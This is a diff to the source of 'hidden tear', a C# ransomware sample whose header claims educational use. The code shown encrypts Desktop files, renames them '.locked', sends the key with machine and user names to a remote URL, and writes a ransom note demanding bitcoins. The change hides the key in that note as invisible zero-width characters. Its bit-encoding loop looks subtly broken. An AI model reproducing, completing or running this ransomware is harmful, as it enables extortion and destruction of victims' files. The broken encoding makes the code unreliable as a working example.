@@ -1,20 +1,20 @@
 ﻿/*
- _     _     _     _              _                  
-| |   (_)   | |   | |            | |                 
-| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
+ _     _     _     _              _
+| |   (_)   | |   | |            | |
+| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __
 | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
-| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
-|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
- 
- * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
+| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |
+|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|
+
+ * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com
  * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
  * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
- * 
- * Ve durdu saatler 
+ *
+ * Ve durdu saatler
  * Susuyor seni zaman
  * Sesin dondu kulagimda
  * Dedi uykudan uyan
- * 
+ *
  * Yine boyle bir aksamdi
  * Sen guluyordun ya gozlerimin icine
  * Feslegenler boy vermisti
@@ -50,6 +50,7 @@ namespace hidden_tear
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
+		string password;
         int sendControl = 0;
 
 
@@ -118,7 +119,7 @@ namespace hidden_tear
 
         //Sends created password target location
         public void SendPassword(string password){
-            
+
             string info = computerName + "-" + userName + " " + password;
             var fullUrl = targetURL + info;
             var conent = new System.Net.WebClient().DownloadString(fullUrl);
@@ -140,14 +141,14 @@ namespace hidden_tear
             System.IO.File.Move(file, file+".locked");
 
             passwordBytes = null;
-            
+
 
         }
 
         //encrypts target directory
         public void encryptDirectory(string location)
         {
-            string password = CreatePassword(15);
+            password = CreatePassword(15);
             //extensions to be encrypt
             var validExtensions = new[]
             {
@@ -168,29 +169,38 @@ namespace hidden_tear
             }
             if (sendControl == 0)
             {
-                
+
                 SendPassword(password);
                 sendControl++;
             }
-            password = null;
         }
 
         public void startAction()
         {
-            
+
             string path = "\\Desktop";
             string startPath = userDir + userName + path;
             encryptDirectory(startPath);
             messageCreator();
-            System.Windows.Forms.Application.Exit();
+			password = null;
+			System.Windows.Forms.Application.Exit();
         }
 
         public void messageCreator()
         {
             string path = "\\Desktop\\READ_IT.txt";
             string fullpath = userDir + userName + path;
-            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
-            System.IO.File.WriteAllLines(fullpath, lines);
+	        char bin0 = '\u200B'; // ZERO WIDTH SPACE
+	        char bin1 = '\u180E'; // MONGOLIAN VOWEL SEPARATOR
+            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk.", "" };
+	        string NSA_KEY = "";
+			for (int x = 0;x < password.Length;x++) {
+				string bin = Convert.ToString(password[x], 2);
+				for (int i = 0;i < 8;i++)
+					NSA_KEY += bin[i] == '1' ? bin1 : bin0;
+			}
+	        lines[lines.Length - 1] = NSA_KEY;
+			System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
 }
